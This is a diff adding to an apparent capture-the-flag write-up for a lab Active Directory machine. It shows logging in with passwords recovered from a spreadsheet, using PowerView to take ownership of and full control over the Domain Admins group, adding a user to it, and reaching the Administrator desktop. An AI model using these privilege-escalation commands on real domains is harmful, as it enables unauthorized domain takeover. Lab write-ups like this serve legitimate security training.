@@ -318,7 +318,7 @@ evil-winrm-py PS C:\Users\smith\Documents>
 
 I can now authenticate as this user to WINRM
 
-# Compromising `maria`
+# Compromising `maria` using logon script
 
 Ive applied an SPN but the hash wont crack and i dont think PKINIT is supported so i cant do shadow credentials
 
@@ -395,4 +395,116 @@ Downloading C:\ProgramData\Engines.xls: 64.0kB [00:00, 992MB/s]
 evil-winrm-py PS C:\ProgramData>
 ```
 
-Ill then download this to my m
+Ill then download this to my machine
+
+![](Pasted%20image%2020260925203638.png)
+
+I have found some passwords
+
+```python
+d34gb8@
+0de_434_d545
+W3llcr4ft3d_4cls
+```
+
+```python
+evil-winrm-py -i 10.129.62.43 -u maria -p 'W3llcr4ft3d_4cls'
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.6.0
+
+[*] Connecting to '10.129.62.43:5985' as 'maria'
+evil-winrm-py PS C:\Users\maria\Documents>
+```
+
+I now have access as this user
+
+# Domain Admin
+
+```python
+evil-winrm-py PS C:\Users\maria\Desktop> upload powerview.ps1 .
+Uploading /home/kali/htb/object/powerview.ps1: 768kB [00:01, 458kB/s]                                        
+[+] File uploaded successfully as: C:\Users\maria\Desktop\powerview.ps1
+evil-winrm-py PS C:\Users\maria\Desktop> . .\powerview.ps1
+evil-winrm-py PS C:\Users\maria\Desktop> Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'maria'
+evil-winrm-py PS C:\Users\maria\Desktop> Add-DomainObjectAcl -Rights 'All' -TargetIdentity "Domain Admins" -PrincipalIdentity "maria"
+evil-winrm-py PS C:\Users\maria\Desktop>
+```
+
+Ill upload powerview once again, then import it
+
+And afterwards i can take ownership and grant full control over the group
+
+```python
+evil-winrm-py PS C:\Users\maria\Desktop> Add-DomainGroupMember "Domain Admins" -Members "maria"
+```
+
+Then ill just add `maria` to the group
+
+```python
+evil-winrm-py -i 10.129.62.43 -u maria -p 'W3llcr4ft3d_4cls'
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.6.0
+
+[*] Connecting to '10.129.62.43:5985' as 'maria'
+evil-winrm-py PS C:\Users\maria\Documents> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State  
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+evil-winrm-py PS C:\Users\maria\Documents>
+```
+
+Domain Admin
+
+```python
+evil-winrm-py PS C:\Users\maria\Documents> cd ../../Administrator/Desktop
+evil-winrm-py PS C:\Users\Administrator\Desktop> dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name                                                                   
+----                -------------         ------ ----                                                                   
+-ar---        9/25/2026   9:05 AM             34 root.txt                                                               
+
+
+evil-winrm-py PS C:\Users\Administrator\Desktop>
+```
+
+Full domain compromise!
+
